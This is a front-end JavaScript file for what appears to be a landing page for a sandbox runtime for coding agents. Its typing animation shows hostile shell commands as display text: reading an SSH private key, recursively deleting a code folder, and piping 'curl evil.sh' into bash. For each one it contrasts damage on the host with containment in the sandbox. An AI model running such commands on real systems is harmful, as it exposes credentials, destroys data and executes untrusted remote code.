/* ── Theme toggle ── */
(function () {
  var KEY = 'agbox-theme';
  var theme = localStorage.getItem(KEY) || 'light';
  if (theme === 'dark') document.documentElement.classList.add('dark');

  function toggle() {
    theme = theme === 'dark' ? 'light' : 'dark';
    localStorage.setItem(KEY, theme);
    document.documentElement.classList.toggle('dark', theme === 'dark');
  }

  document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('themeToggle').addEventListener('click', toggle);
    var mt = document.getElementById('mobileThemeToggle');
    if (mt) mt.addEventListener('click', toggle);
    document.getElementById('hamburgerBtn').addEventListener('click', function() {
      document.getElementById('mobileMenu').classList.toggle('open');
    });
  });
}());

/* ── Nested host/sandbox typing animation ── */
(function () {
  var LINES = [
    {
      cmd:    'cat ~/.ssh/id_rsa',
      host:   { text:'-----BEGIN RSA PRIVATE KEY-----', cls:'t-bad' },
      sandbox:{ text:'\u2298  host filesystem \u2014 not mounted', cls:'t-blocked' }
    },
    {
      cmd:    'rm -rf ~/code/',
      host:   { text:'removed 1,247 files\u2026', cls:'t-bad' },
      sandbox:{ text:'\u2298  path outside /workspace \u2014 blocked', cls:'t-blocked' }
    },
    {
      cmd:    'curl evil.sh | bash',
      host:   { text:'executing remote payload\u2026', cls:'t-bad' },
      sandbox:{ text:'\u2713  internet open \u2014 host untouched', cls:'t-ok' }
    }
  ];

  var hostBody       = document.getElementById('hostBody');
  var sandboxBody    = document.getElementById('sandboxBody');
  var hostFrame      = document.getElementById('hostFrame');
  var sandboxFrame   = document.getElementById('sandboxFrame');
  var hostDangerOvl  = document.getElementById('hostDangerOverlay');
  var safeOvl        = document.getElementById('safeOverlay');

  function delay(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }

  async function typeText(el, text, ms) {
    for (var i = 0; i < text.length; i++) { el.textContent += text[i]; await delay(ms); }
  }

  async function typeCmdLine(body, cmd) {
    var row = document.createElement('div'); row.className = 't-line'; body.appendChild(row);
    var p = document.createElement('span'); p.className = 't-prompt'; p.textContent = '$ '; row.appendChild(p);
    var c = document.createElement('span'); c.className  = 't-cmd';   row.appendChild(c);
    var cur = document.createElement('span'); cur.className = 't-cursor'; row.appendChild(cur);
    await typeText(c, cmd, 42);
    cur.remove();
  }

  function showOutput(body, text, cls) {
    var el = document.createElement('div');
    el.className = 't-out ' + (cls || '');
    el.textContent = text;
    el.style.animation = 'fadeIn 0.25s ease forwards';
    body.appendChild(el);
  }

  async function run() {
    hostBody.innerHTML = sandboxBody.innerHTML = '';
    hostFrame.classList.remove('danger');
    hostDangerOvl.classList.remove('show');
    sandboxFrame.classList.remove('glowing');
    safeOvl.classList.remove('show');
    await delay(400);

    for (var i = 0; i < LINES.length; i++) {
      var ln = LINES[i];
      await Promise.all([
        typeCmdLine(hostBody, ln.cmd),
        typeCmdLine(sandboxBody, ln.cmd)
      ]);
      await delay(120);
      showOutput(hostBody,    ln.host.text,    ln.host.cls);
      showOutput(sandboxBody, ln.sandbox.text, ln.sandbox.cls);
      await delay(i < LINES.length - 1 ? 650 : 300);
    }

    await delay(350);
    sandboxFrame.classList.add('glowing');
    safeOvl.classList.add('show');
    hostFrame.classList.add('danger');
    hostDangerOvl.classList.add('show');
    await delay(3200);
    safeOvl.classList.remove('show');
    hostDangerOvl.classList.remove('show');
    await delay(400);
    hostFrame.classList.remove('danger');
    sandboxFrame.classList.remove('glowing');
    await delay(400);
    run();
  }

  document.addEventListener('DOMContentLoaded', function() { setTimeout(run, 700); });
}());

/* ── Scroll reveal ── */
(function () {
  var obs = new IntersectionObserver(function(entries) {
    entries.forEach(function(e) {
      if (e.isIntersecting) { e.target.classList.add('visible'); obs.unobserve(e.target); }
    });
  }, { threshold: 0.12 });
  document.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('.reveal, .reveal-stagger, .bento-reveal').forEach(function(el) {
      obs.observe(el);
    });
  });
}());

/* ── Utilities ── */
function closeMobileMenu() { document.getElementById('mobileMenu').classList.remove('open'); }
function copyCommands() {
  navigator.clipboard.writeText(
    'docker pull ghcr.io/agents-sandbox/coding-runtime:latest\npip install agents-sandbox'
  ).then(function() {
    var btn = document.querySelector('.copy-btn');
    btn.textContent = 'Copied!';
    setTimeout(function() { btn.textContent = 'Copy'; }, 1500);
  });
}
